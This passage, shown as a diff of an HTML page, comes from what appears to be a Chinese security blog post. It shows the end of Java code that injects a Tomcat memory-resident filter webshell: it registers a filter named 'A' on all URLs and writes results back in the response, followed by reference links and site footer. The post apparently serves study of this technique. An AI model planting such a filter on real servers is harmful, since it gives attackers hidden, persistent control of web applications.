+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        servletResponse.<span style="color:#57c7ff">getWriter</span>().<span style="color:#57c7ff">write</span>(res.<span style="color:#57c7ff">toString</span>());
+</span></span><span style="display:flex;"><span>                        servletResponse.<span style="color:#57c7ff">getWriter</span>().<span style="color:#57c7ff">flush</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    };
+</span></span><span style="display:flex;"><span>            FilterDef filterDef <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> FilterDef();
+</span></span><span style="display:flex;"><span>            filterDef.<span style="color:#57c7ff">setFilterName</span>(<span style="color:#5af78e">&#34;A&#34;</span>);
+</span></span><span style="display:flex;"><span>            filterDef.<span style="color:#57c7ff">setFilterClass</span>(filter.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getName</span>());
+</span></span><span style="display:flex;"><span>            filterDef.<span style="color:#57c7ff">setFilter</span>(filter);
+</span></span><span style="display:flex;"><span>            standardContext.<span style="color:#57c7ff">addFilterDef</span>(filterDef);
+</span></span><span style="display:flex;"><span>            FilterMap filterMap <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> FilterMap();
+</span></span><span style="display:flex;"><span>            filterMap.<span style="color:#57c7ff">setFilterName</span>(<span style="color:#5af78e">&#34;A&#34;</span>);
+</span></span><span style="display:flex;"><span>            filterMap.<span style="color:#57c7ff">addURLPattern</span>(<span style="color:#5af78e">&#34;/*&#34;</span>);
+</span></span><span style="display:flex;"><span>            standardContext.<span style="color:#57c7ff">addFilterMap</span>(filterMap);
+</span></span><span style="display:flex;"><span>            standardContext.<span style="color:#57c7ff">filterStart</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">//本地测试时取消下面这行可以帮助观察是否注入成功</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">//System.out.println(&#34;injected&#34;);</span>
+</span></span><span style="display:flex;"><span>        }<span style="color:#ff6ac1">catch</span> (Throwable t){
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">//t.printStackTrace();</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/258575#h2-2">https://www.anquanke.com/post/id/258575#h2-2</a></p>
+<p><a href="https://blog.csdn.net/RABCDXB/article/details/125576643">https://blog.csdn.net/RABCDXB/article/details/125576643</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/121203831">https://blog.csdn.net/rfrder/article/details/121203831</a></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+
+  
+    <script src="/js/clipboard.js"></script>
+  
+
+  
+  
+
+    
+      
+      
+      <div class="site-footer">
+        <div class="busuanzi-footer">
+          <span id="busuanzi_container_site_pv">
+            本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+          </span>
+          <span class="separator">|</span> 
+          <span id="busuanzi_container_site_uv">
+            本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+          </span>
+        </div>
+        <p class="footer-beian"> 
+          <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">
+            蜀ICP备2021024344号-1
+          </a>
+        </p>
+      </div>
+
+      
+    </div>
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
